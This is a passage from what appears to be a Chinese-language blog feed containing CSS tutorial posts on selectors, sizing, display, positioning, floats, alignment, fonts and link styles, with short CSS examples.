href="#5-2-嵌套选择器" class="headerlink" title="5.2 嵌套选择器"></a>5.2 嵌套选择器</h3><p>可能适用于选择器内部的选择器的样式。</p><p>实例：为所有 p 元素指定一个样式，为所有元素指定一个 class=”marked”的样式，并仅用于class=”marked”，类内的 p 元素指定第三个样式：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>&#123;<br><span class="hljs-attribute">color</span>:blue;<br><span class="hljs-attribute">text-align</span>:center;<br>&#125;<br><span class="hljs-selector-class">.marked</span>&#123;<br><span class="hljs-attribute">background-color</span>:red;<br>&#125;<br><span class="hljs-selector-class">.marked</span> <span class="hljs-selector-tag">p</span>&#123;<br><span class="hljs-attribute">color</span>:white;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="6-尺寸（Dimension）"><a href="#6-尺寸（Dimension）" class="headerlink" title="6.尺寸（Dimension）"></a>6.尺寸（Dimension）</h2><p>CSS 尺寸 (Dimension) 属性允许控制元素的高度和宽度。同样，允许增加行间距。</p><p>尺寸属性：</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">height</td><td align="center">设置元素的高度。</td></tr><tr><td align="center">line-height</td><td align="center">设置行高。</td></tr><tr><td align="center">max-height</td><td align="center">设置元素的最大高度。</td></tr><tr><td align="center">max-width</td><td align="center">设置元素的最大宽度。</td></tr><tr><td align="center">min-height</td><td align="center">设置元素的最小高度。</td></tr><tr><td align="center">min-width</td><td align="center">设置元素的最小宽度。</td></tr><tr><td align="center">width</td><td align="center">设置元素的宽度。</td></tr></tbody></table><h2 id="7-显示（Display）与可见性（Visibility）"><a href="#7-显示（Display）与可见性（Visibility）" class="headerlink" title="7.显示（Display）与可见性（Visibility）"></a>7.显示（Display）与可见性（Visibility）</h2><p>CSS display 属性和 visibility 属性都可以用来隐藏某个元素，但是这两个属性有不同的定义。display 属性设置一个元素应如何显示，visibility 属性指定一个元素应可见还是隐藏。</p><h3 id="7-1-隐藏元素（display-none-或-visibility-hidden）"><a href="#7-1-隐藏元素（display-none-或-visibility-hidden）" class="headerlink" title="7.1 隐藏元素（display:none 或 visibility:hidden）"></a>7.1 隐藏元素（display:none 或 visibility:hidden）</h3><p>隐藏一个元素可以通过把 display 属性设置为”none”，或把 visibility 属性设置为”hidden”。但是请注意，这两种方法会产生不同的结果。</p><p>visibility:hidden 可以隐藏某个元素，但隐藏的元素 <span style="color:green">仍需占用与未隐藏之前一样的空间</span> 。也就是说，该元素虽然被隐藏了，但仍然会影响布局。</p><p>display:none 可以隐藏某个元素，且隐藏的元素 <span style="color:green">不会占用任何空间</span> 。也就是说，该元素不但被隐藏了，而且该元素原本占用的空间也会从页面布局中消失。</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span><span class="hljs-selector-class">.hidden</span> &#123;<span class="hljs-attribute">visibility</span>:hidden;&#125;<br><br><span class="hljs-selector-tag">h1</span><span class="hljs-selector-class">.hidden</span> &#123;<span class="hljs-attribute">display</span>:none;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="7-2-块和内联元素"><a href="#7-2-块和内联元素" class="headerlink" title="7.2 块和内联元素"></a>7.2 块和内联元素</h3><p>块元素是一个元素，占用了全部宽度，在前后都是换行符。即会单独占据一行。<br>如：h1、p、div 等。</p><p>内联元素只需要必要的宽度，不强制换行。即不是单独占据一行。可以在后面继续放其他元素。<br>如：span、a 等。</p><h3 id="7-3-更改内联元素为块元素"><a href="#7-3-更改内联元素为块元素" class="headerlink" title="7.3 更改内联元素为块元素"></a>7.3 更改内联元素为块元素</h3><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">span</span> &#123;<span class="hljs-attribute">display</span>:block;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="7-4-更改内块元素为内联元素"><a href="#7-4-更改内块元素为内联元素" class="headerlink" title="7.4 更改内块元素为内联元素"></a>7.4 更改内块元素为内联元素</h3><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">li</span> &#123;<span class="hljs-attribute">display</span>:inline;&#125;<br></code></pre></div></td></tr></table></figure><p>变更元素的显示类型看该元素是如何显示，它是什么样的元素。例如：一个内联元素设置为 display:block 是不允许有它内部的嵌套块元素。</p><h2 id="8-定位（Positioning）"><a href="#8-定位（Positioning）" class="headerlink" title="8.定位（Positioning）"></a>8.定位（Positioning）</h2><p>CSS position 属性，允许将布局的一部分与另一部分重叠。<br>CSS 定位属性允许为一个元素定位。也可以将一个元素放在另一个元素后面，并指定一个元素的内容太大时，应该发生什么。</p><p>元素可以使用的顶部，底部，左侧和右侧属性定位。然而，这些属性无法工作，除非事先设定 position 属性。他们也有不同的工作方式，这取决于定位方法.</p><p>有四种不同的定位方法：Static 定位、Fixed 定位、Relative 定位、Absolute 定位。</p><p>定位属性：</p><table><thead><tr><th align="center">属性</th><th align="center">说明</th><th align="center">值</th><th align="center">CSS</th></tr></thead><tbody><tr><td align="center">bottom</td><td align="center">定义了定位元素下外边距边界与其包含块下边界之间的偏移。</td><td align="center">auto *length % *inherit</td><td align="center">2</td></tr><tr><td align="center">clip</td><td align="center">剪辑一个绝对定位的元素</td><td align="center">*shape *auto inherit</td><td align="center">2</td></tr><tr><td align="center">cursor</td><td align="center">显示光标移动到指定的类型</td><td align="center"><em>url</em> auto crosshair default pointer move e-resize ne-resize nw-resize n-resize se-resize sw-resize s-resize w-resize text wait help</td><td align="center">2</td></tr><tr><td align="center">left</td><td align="center">定义了定位元素左外边距边界与其包含块左边界之间的偏移。</td><td align="center">auto *length % *inherit</td><td align="center">2</td></tr><tr><td align="center">overflow</td><td align="center">设置当元素的内容溢出其区域时发生的事情。</td><td align="center">auto hidden scroll visible inherit</td><td align="center">2</td></tr><tr><td align="center">position</td><td align="center">指定元素的定位类型</td><td align="center">absolute fixed relative static inherit</td><td align="center">2</td></tr><tr><td align="center">right</td><td align="center">定义了定位元素右外边距边界与其包含块右边界之间的偏移。</td><td align="center">auto *length % *inherit</td><td align="center">2</td></tr><tr><td align="center">top</td><td align="center">定义了一个定位元素的上外边距边界与其包含块上边界之间的偏移。</td><td align="center">auto *length % *inherit</td><td align="center">2</td></tr><tr><td align="center">z-index</td><td align="center">设置元素的堆叠顺序</td><td align="center">*number *auto inherit</td><td align="center">2</td></tr></tbody></table><h3 id="8-1-Static-定位"><a href="#8-1-Static-定位" class="headerlink" title="8.1 Static 定位"></a>8.1 Static 定位</h3><p>HTML 元素的默认值，即没有定位，元素出现在正常的流中。静态定位的元素不会受到 top, bottom, left, right 影响。</p><h3 id="8-2-Fixed-定位"><a href="#8-2-Fixed-定位" class="headerlink" title="8.2 Fixed 定位"></a>8.2 Fixed 定位</h3><p>元素的位置相对于浏览器窗口是固定位置。即使窗口是滚动的它也不会移动：</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.pos_fixed</span>&#123;<br><span class="hljs-attribute">position</span>:fixed;<br><span class="hljs-attribute">top</span>:<span class="hljs-number">30px</span>;<br><span class="hljs-attribute">right</span>:<span class="hljs-number">5px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>Fixed 定位使元素的位置与文档流无关，因此不占据空间。Fixed 定位的元素和其他元素重叠。</p><h3 id="8-3-Relative-定位"><a href="#8-3-Relative-定位" class="headerlink" title="8.3 Relative 定位"></a>8.3 Relative 定位</h3><p>相对定位元素的定位是相对其正常位置。</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h2</span><span class="hljs-selector-class">.pos_left</span>&#123;<br><span class="hljs-attribute">position</span>:relative;<br><span class="hljs-attribute">left</span>:-<span class="hljs-number">20px</span>;<br>&#125;<br><span class="hljs-selector-tag">h2</span><span class="hljs-selector-class">.pos_right</span>&#123;<br><span class="hljs-attribute">position</span>:relative;<br><span class="hljs-attribute">left</span>:<span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以移动的相对定位元素的内容和相互重叠的元素，它原本所占的空间不会改变。<br>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h2</span><span class="hljs-selector-class">.pos_top</span>&#123;<br><span class="hljs-attribute">position</span>:relative;<br><span class="hljs-attribute">top</span>:-<span class="hljs-number">50px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>相对定位元素经常被用来作为绝对定位元素的容器块。</p><h3 id="8-4-Absolute-定位"><a href="#8-4-Absolute-定位" class="headerlink" title="8.4 Absolute 定位"></a>8.4 Absolute 定位</h3><p>绝对定位的元素的位置相对于最近的已定位父元素，如果元素没有已定位的父元素，那么它的位置相对于 &lt;html&gt;：</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h2</span>&#123;<br><span class="hljs-attribute">position</span>:absolute;<br><span class="hljs-attribute">left</span>:<span class="hljs-number">100px</span>;<br><span class="hljs-attribute">top</span>:<span class="hljs-number">150px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>Absolutely 定位使元素的位置与文档流无关，因此不占据空间。Absolutely 定位的元素和其他元素重叠。</p><h3 id="8-5-重叠的元素"><a href="#8-5-重叠的元素" class="headerlink" title="8.5 重叠的元素"></a>8.5 重叠的元素</h3><p>元素的定位与文档流无关，所以它们可以覆盖页面上的其它元素。z-index 属性指定了一个元素的堆叠顺序（哪个元素应该放在前面，或后面），具有更高堆叠顺序的元素总是在较低的堆叠顺序元素的前面。一个元素可以有正数或负数的堆叠顺序：</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">img</span>&#123;<br><span class="hljs-attribute">position</span>:absolute;<br><span class="hljs-attribute">left</span>:<span class="hljs-number">0px</span>;<br><span class="hljs-attribute">top</span>:<span class="hljs-number">0px</span>;<br><span class="hljs-attribute">z-index</span>:-<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>如果两个定位元素重叠，没有指定 z - index，最后定位在 HTML 代码中的元素将被显示在最前面。</p><h2 id="9-浮动（Float）"><a href="#9-浮动（Float）" class="headerlink" title="9.浮动（Float）"></a>9.浮动（Float）</h2><p>CSS float 属性定义元素在哪个方向浮动，浮动元素会生成一个块级框，直到该块级框的外边缘碰到包含框或者其他的浮动框为止。CSS 的 Float（浮动），会使元素向左或向右移动，其周围的元素也会重新排列。Float（浮动），往往是用于图像，但它在布局时一样非常有用。</p><p>元素的水平方向浮动，意味着元素只能左右移动而不能上下移动。一个浮动元素会尽量向左或向右移动，直到它的外边缘碰到包含框或另一个浮动框的边框为止。浮动元素之后的元素将围绕它。浮动元素之前的元素将不会受到影响。</p><p>浮动属性：</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th><th align="center">值</th><th align="center">CSS</th></tr></thead><tbody><tr><td align="center">clear</td><td align="center">指定不允许元素周围有浮动元素。</td><td align="center">left right both none inherit</td><td align="center">1</td></tr><tr><td align="center">float</td><td align="center">指定一个盒子（元素）是否可以浮动。</td><td align="center">left right none inherit</td><td align="center">1</td></tr></tbody></table><p>实例：如果图像是右浮动，文本流将环绕在它左边：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">img</span>&#123;<br><span class="hljs-attribute">float</span><span class="hljs-selector-pseudo">:right</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="9-1-彼此相邻的浮动元素"><a href="#9-1-彼此相邻的浮动元素" class="headerlink" title="9.1 彼此相邻的浮动元素"></a>9.1 彼此相邻的浮动元素</h3><p>如果把几个浮动的元素放到一起，如果有空间的话，它们将彼此相邻。</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.thumbnail</span>&#123;<br><span class="hljs-attribute">float</span><span class="hljs-selector-pseudo">:left</span>;<br><span class="hljs-attribute">width</span>:<span class="hljs-number">110px</span>;<br><span class="hljs-attribute">height</span>:<span class="hljs-number">90px</span>;<br><span class="hljs-attribute">margin</span>:<span class="hljs-number">5px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="9-2-清除浮动（clear）"><a href="#9-2-清除浮动（clear）" class="headerlink" title="9.2 清除浮动（clear）"></a>9.2 清除浮动（clear）</h3><p>元素浮动之后，周围的元素会重新排列，为了避免这种情况，使用 clear 属性。clear 属性指定元素两侧不能出现浮动元素。</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.text_line</span>&#123;<br><span class="hljs-attribute">clear</span>:both;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="10-水平对齐（Horizontal-Align）"><a href="#10-水平对齐（Horizontal-Align）" class="headerlink" title="10.水平对齐（Horizontal Align）"></a>10.水平对齐（Horizontal Align）</h2><p>关于 CSS 中元素的水平对齐 (Horizontal Align)，可以使用多种属性来进行设置。</p><h3 id="10-1-块元素对齐"><a href="#10-1-块元素对齐" class="headerlink" title="10.1 块元素对齐"></a>10.1 块元素对齐</h3><p>块元素是一个元素，占用了全宽，前后都是换行符。</p><h3 id="10-2-中心对齐（margin）"><a href="#10-2-中心对齐（margin）" class="headerlink" title="10.2 中心对齐（margin）"></a>10.2 中心对齐（margin）</h3><p>块元素可以把左，右页边距设置为”自动”对齐。margin属性可任意拆分为左，右页边距设置自动指定，结果都是出现居中元素：</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.center</span>&#123;<br><span class="hljs-attribute">margin-left</span>:auto;<br><span class="hljs-attribute">margin-right</span>:auto;<br><span class="hljs-attribute">width</span>:<span class="hljs-number">70%</span>;<br><span class="hljs-attribute">background-color</span>:<span class="hljs-number">#b0e0e6</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="10-3-左右对齐（position）"><a href="#10-3-左右对齐（position）" class="headerlink" title="10.3 左右对齐（position）"></a>10.3 左右对齐（position）</h3><p>元素对齐的方法之一是使用绝对定位：</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.right</span>&#123;<br><span class="hljs-attribute">position</span>:absolute;<br><span class="hljs-attribute">right</span>:<span class="hljs-number">0px</span>;<br><span class="hljs-attribute">width</span>:<span class="hljs-number">300px</span>;<br><span class="hljs-attribute">background-color</span>:<span class="hljs-number">#b0e0e6</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>绝对定位与文档流无关，所以它们可以覆盖页面上的其它元素。</p><h3 id="10-4-左右对齐（float）"><a href="#10-4-左右对齐（float）" class="headerlink" title="10.4 左右对齐（float）"></a>10.4 左右对齐（float）</h3><p>使用 float 属性是对齐元素的方法之一：</p><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.right</span>&#123;<br><span class="hljs-attribute">float</span><span class="hljs-selector-pseudo">:right</span>;<br><span class="hljs-attribute">width</span>:<span class="hljs-number">300px</span>;<br><span class="hljs-attribute">background-color</span>:<span class="hljs-number">#b0e0e6</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="垂直居中对齐（padding）"><a href="#垂直居中对齐（padding）" class="headerlink" title="垂直居中对齐（padding）"></a>垂直居中对齐（padding）</h3><p>CSS 中一个简单的设置垂直居中对齐的方式就是头部顶部使用 padding：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.center</span> &#123; <span class="hljs-attribute">padding</span>: <span class="hljs-number">70px</span> <span class="hljs-number">0</span>; <span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> solid green; &#125;<br></code></pre></div></td></tr></table></figure><p>如果要水平和垂直都居中，可以使用 padding 和 text-align: center：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.center</span> &#123; <span class="hljs-attribute">padding</span>: <span class="hljs-number">70px</span> <span class="hljs-number">0</span>; <span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> solid green; <span class="hljs-attribute">text-align</span>: center; &#125;<br></code></pre></div></td></tr></table></figure><hr>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-CSS基础知识复习（二）</title>
    <link href="/2021/05/13/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-CSS%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2021/05/13/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-CSS%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>CSS 指层叠样式表（Cascading Style Sheets）。通过与 XHTML 结合，CSS 可以帮助我们实行表现与结构分离的开发模式。 通过使用 CSS 来提升工作效率！<br>外部样式表通常存储在 CSS 文件中，外部样式表可以极大提高工作效率。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-字体（fonts）"><a href="#1-字体（fonts）" class="headerlink" title="1.字体（fonts）"></a>1.字体（fonts）</h2><p>CSS字体属性定义字体，加粗，大小，文字样式。</p><h3 id="1-1-字型"><a href="#1-1-字型" class="headerlink" title="1.1 字型"></a>1.1 字型</h3><ul><li>通用字体系列 - 拥有相似外观的字体系统组合（如 “Serif” 或 “Monospace”）</li><li>特定字体系列 - 一个特定的字体系列（如 “Times” 或 “Courier”）</li></ul><p>除了各种特定的字体系列外，CSS 定义了 5 种通用字体系列：</p><ul><li>Serif 字体</li><li>Sans-serif 字体</li><li>Monospace 字体</li><li>Cursive 字体</li><li>Fantasy 字体</li></ul><h3 id="1-2-字体系列（font-family）"><a href="#1-2-字体系列（font-family）" class="headerlink" title="1.2 字体系列（font-family）"></a>1.2 字体系列（font-family）</h3><p>font-family 属性设置文本的字体系列。font-family 属性应该设置几个字体名称作为一种”后备”机制，如果浏览器不支持第一种字体，他将尝试下一种字体。</p><p>如果字体系列的名称超过一个字，它必须用引号，如 Font Family：”宋体”。多个字体系列是用一个逗号分隔指明。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>&#123;<span class="hljs-attribute">font-family</span>:<span class="hljs-string">&quot;Times New Roman&quot;</span>, Times, serif;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-3-字体样式（font-style）"><a href="#1-3-字体样式（font-style）" class="headerlink" title="1.3 字体样式（font-style）"></a>1.3 字体样式（font-style）</h3><p>主要是用于指定斜体文字的字体样式属性。这个属性有三个值：正常 - 正常显示文本、斜体 - 以斜体字显示的文字、倾斜的文字 - 文字向一边倾斜（和斜体非常类似，但不太支持）。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.normal</span> &#123;<span class="hljs-attribute">font-style</span>:normal;&#125;<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.italic</span> &#123;<span class="hljs-attribute">font-style</span>:italic;&#125;<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.oblique</span> &#123;<span class="hljs-attribute">font-style</span>:oblique;&#125;<br></code></pre></div></td></tr></table></figure><p><strong>italic 和 oblique 的区别</strong></p><ul><li>斜体（italic）是一种简单的字体风格，对每个字母的结构有一些小改动，来反映变化的外观。</li><li>倾斜（oblique）文本是正常竖直文本的一个倾斜版本。</li></ul><p>通常情况下，italic 和 oblique 文本在 web 浏览器中看上去完全一样。</p><h3 id="1-4字体大小（font-size）"><a href="#1-4字体大小（font-size）" class="headerlink" title="1.4字体大小（font-size）"></a>1.4字体大小（font-size）</h3><p>font-size 属性设置文本的大小。字体大小的值可以是绝对或相对的大小。</p><blockquote><p>绝对大小：</p></blockquote><ul><li>设置一个指定大小的文本</li><li>不允许用户在所有浏览器中改变文本大小</li><li>确定了输出的物理尺寸时绝对大小很有用</li></ul><blockquote><p>相对大小：</p></blockquote><ul><li>相对于周围的元素来设置大小</li><li>允许用户在浏览器中改变文字大小</li></ul><p>如果不指定一个字体的大小，默认大小和普通文本段落一样，是16像素（16px=1em）。</p><h3 id="1-5-设置字体大小像素"><a href="#1-5-设置字体大小像素" class="headerlink" title="1.5 设置字体大小像素"></a>1.5 设置字体大小像素</h3><p>设置文字的大小与像素，能完全控制文字大小。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">40px</span>;&#125;<br><span class="hljs-selector-tag">h2</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">30px</span>;&#125;<br><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">14px</span>;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-6-用em来设置字体大小"><a href="#1-6-用em来设置字体大小" class="headerlink" title="1.6 用em来设置字体大小"></a>1.6 用em来设置字体大小</h3><p>为了避免 Internet Explorer 中无法调整文本的问题，许多开发者使用 em 单位代替像素。em 的尺寸单位由W3C建议。1em 和当前字体大小相等。在浏览器中默认的文字大小是16px。因此，1em的默认大小是16px。可以通过下面这个公式将像素转换为em：px/16=em</p><p><strong>注意：</strong>注：16 等于父元素的默认字体大小，假设父元素的 font-size 为 30px，那么公式需改为：pixels/30=em。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">2.5em</span>;&#125; <span class="hljs-comment">/* 40px/16=2.5em */</span><br><span class="hljs-selector-tag">h2</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">1.875em</span>;&#125; <span class="hljs-comment">/* 30px/16=1.875em */</span><br><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">0.875em</span>;&#125; <span class="hljs-comment">/* 14px/16=0.875em */</span><br></code></pre></div></td></tr></table></figure><h3 id="1-7-用百分比和em组合"><a href="#1-7-用百分比和em组合" class="headerlink" title="1.7 用百分比和em组合"></a>1.7 用百分比和em组合</h3><p>在所有浏览器的解决方案中，设置 &lt;body&gt;元素的默认字体大小的是百分比。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">100%</span>;&#125;<br><span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">2.5em</span>;&#125;<br><span class="hljs-selector-tag">h2</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">1.875em</span>;&#125;<br><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">0.875em</span>;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-8-字体属性"><a href="#1-8-字体属性" class="headerlink" title="1.8 字体属性"></a>1.8 字体属性</h3><table><thead><tr><th align="center">Property</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">font</td><td align="center">在一个声明中设置所有的字体属性</td></tr><tr><td align="center">font-family</td><td align="center">指定文本的字体系列</td></tr><tr><td align="center">font-size</td><td align="center">指定文本的字体大小</td></tr><tr><td align="center">font-style</td><td align="center">指定文本的字体样式</td></tr><tr><td align="center">font-variant</td><td align="center">以小型大写字体或者正常字体显示文本。</td></tr><tr><td align="center">font-weight</td><td align="center">指定字体的粗细。</td></tr></tbody></table><h2 id="2-链接样式"><a href="#2-链接样式" class="headerlink" title="2.链接样式"></a>2.链接样式</h2><p>不同的链接可以有不同的样式。链接的样式，可以用任何 CSS 属性（如颜色，字体，背景等）。特别的链接，可以有不同的样式，这取决于他们是什么状态。</p><p>四个链接状态：</p><blockquote><ul><li>a:link - 正常，未访问过的链接</li><li>a:visited - 用户已访问过的链接</li><li>a:hover - 当用户鼠标放在链接上时</li><li>a:active - 链接被点击的那一刻</li></ul></blockquote><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span> &#123;<span class="hljs-attribute">color</span>:<span class="hljs-number">#FF0000</span>;&#125;      <span class="hljs-comment">/* 未访问链接*/</span><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span> &#123;<span class="hljs-attribute">color</span>:<span class="hljs-number">#00FF00</span>;&#125;  <span class="hljs-comment">/* visited link */</span><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<span class="hljs-attribute">color</span>:<span class="hljs-number">#FF00FF</span>;&#125;  <span class="hljs-comment">/* mouse over link */</span><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:active</span> &#123;<span class="hljs-attribute">color</span>:<span class="hljs-number">#0000FF</span>;&#125;  <span class="hljs-comment">/* selected link 